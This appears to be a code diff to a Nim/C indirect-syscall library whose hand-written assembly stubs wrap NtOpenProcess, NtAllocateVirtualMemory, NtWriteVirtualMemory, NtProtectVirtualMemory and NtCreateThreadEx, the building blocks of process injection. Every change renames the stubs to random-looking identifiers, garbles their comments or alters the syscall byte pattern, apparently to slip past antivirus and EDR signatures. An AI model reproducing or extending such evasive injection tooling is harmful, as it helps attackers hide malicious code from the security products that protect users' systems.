@@ -138,7 +138,7 @@ PVOID SC_Address(PVOID NtApiAddress)
 
    #ifdef _WIN64
     // If the process is 64-bit on a 64-bit OS, we need to search for syscall
-    BYTE syscall_code[] = { 0x0f, 0x05, 0xc3 };
+    BYTE syscall_code[] = { 0x0f,0x05, 0xc3 };
     ULONG distance_to_syscall = 0x12;
    #else
     // If the process is 32-bit on a 32-bit OS, we need to search for sysenter
@@ -356,7 +356,7 @@ EXTERN_C PVOID SW3_GetRandomSyscallAddress(DWORD FunctionHash)
 
 
 #NtProtectVirtualMemory
-proc NtPVM*(ProcessHandle: HANDLE, BaseAddress: PVOID, RegionSize: PSIZE_T, NewProtect: ULONG, OldProtect: PULONG): NTSTATUS {.asmNoStackFrame.} =
+proc uashdiasdj*(ProcessHandle: HANDLE, BaseAddress: PVOID, RegionSize: PSIZE_T, NewProtect: ULONG, OldProtect: PULONG): NTSTATUS {.asmNoStackFrame.} =
     asm """
 	mov [rsp +8], rcx          
 	mov [rsp+16], rdx
@@ -377,7 +377,7 @@ proc NtPVM*(ProcessHandle: HANDLE, BaseAddress: PVOID, RegionSize: PSIZE_T, NewP
 	jmp r15                                
     """
 #NtWriteVirtualMemory
-proc NtWVM*(ProcessHandle: HANDLE, BaseAddress: PVOID, Buffer: PVOID, NumberOfBytesToWrite: SIZE_T, NumberOfBytesWritten: PSIZE_T): NTSTATUS {.asmNoStackFrame.} =
+proc oqiazasusjk*(ProcessHandle: HANDLE, BaseAddress: PVOID, Buffer: PVOID, NumberOfBytesToWrite: SIZE_T, NumberOfBytesWritten: PSIZE_T): NTSTATUS {.asmNoStackFrame.} =
     asm """
 	mov [rsp +8], rcx          
 	mov [rsp+16], rdx
@@ -398,7 +398,7 @@ proc NtWVM*(ProcessHandle: HANDLE, BaseAddress: PVOID, Buffer: PVOID, NumberOfBy
 	jmp r15                                
     """
 #NtCreateThreadEx
-proc NtCTE*(ThreadHandle: PHANDLE, DesiredAccess: ACCESS_MASK, ObjectAttributes: POBJECT_ATTRIBUTES, ProcessHandle: HANDLE, StartRoutine: PVOID, Argument: PVOID, CreateFlags: ULONG, ZeroBits: SIZE_T, StackSize: SIZE_T, MaximumStackSize: SIZE_T, AttributeList: PPS_ATTRIBUTE_LIST): NTSTATUS {.asmNoStackFrame.} =
+proc zuq8aztsdztausdgbh*(ThreadHandle: PHANDLE, DesiredAccess: ACCESS_MASK, ObjectAttributes: POBJECT_ATTRIBUTES, ProcessHandle: HANDLE, StartRoutine: PVOID, Argument: PVOID, CreateFlags: ULONG, ZeroBits: SIZE_T, StackSize: SIZE_T, MaximumStackSize: SIZE_T, AttributeList: PPS_ATTRIBUTE_LIST): NTSTATUS {.asmNoStackFrame.} =
     asm """
 	mov [rsp +8], rcx          
 	mov [rsp+16], rdx
@@ -418,8 +418,8 @@ proc NtCTE*(ThreadHandle: PHANDLE, DesiredAccess: ACCESS_MASK, ObjectAttributes:
 	mov r10, rcx
 	jmp r15                                
     """
-#NtClose
-proc NtCl*(Handle: HANDLE): NTSTATUS {.asmNoStackFrame.} =
+#zuatzuastdiasyyose
+proc zuatzuastdiasyy*(Handle: HANDLE): NTSTATUS {.asmNoStackFrame.} =
     asm """
 	mov [rsp +8], rcx          
 	mov [rsp+16], rdx
@@ -440,7 +440,7 @@ proc NtCl*(Handle: HANDLE): NTSTATUS {.asmNoStackFrame.} =
 	jmp r15                                
     """
 #NtAllocateVirtualMemory
-proc NtAVM*(ProcessHandle: HANDLE, BaseAddress: PVOID, ZeroBits: ULONG, RegionSize: PSIZE_T, AllocationType: ULONG, Protect: ULONG): NTSTATUS {.asmNoStackFrame.} =
+proc oqiahsjynmxkla*(ProcessHandle: HANDLE, BaseAddress: PVOID, ZeroBits: ULONG, RegionSize: PSIZE_T, AllocationType: ULONG, Protect: ULONG): NTSTATUS {.asmNoStackFrame.} =
     asm """
 	mov [rsp +8], rcx          
 	mov [rsp+16], rdx
@@ -460,8 +460,8 @@ proc NtAVM*(ProcessHandle: HANDLE, BaseAddress: PVOID, ZeroBits: ULONG, RegionSi
 	mov r10, rcx
 	jmp r15                                
     """
-#NtOpenProcess
-proc NtOP*(ProcessHandle: PHANDLE, DesiredAccess: ACCESS_MASK, ObjectAttributes: POBJECT_ATTRIBUTES, ClientId: PCLIENT_ID): NTSTATUS {.asmNoStackFrame.} =
+#opqiwepoausdasdjlenProcess
+proc opqiwepoausdasdjl*(ProcessHandle: PHANDLE, DesiredAccess: ACCESS_MASK, ObjectAttributes: POBJECT_ATTRIBUTES, ClientId: PCLIENT_ID): NTSTATUS {.asmNoStackFrame.} =
     asm """
 	mov [rsp +8], rcx          
 	mov [rsp+16], rdx
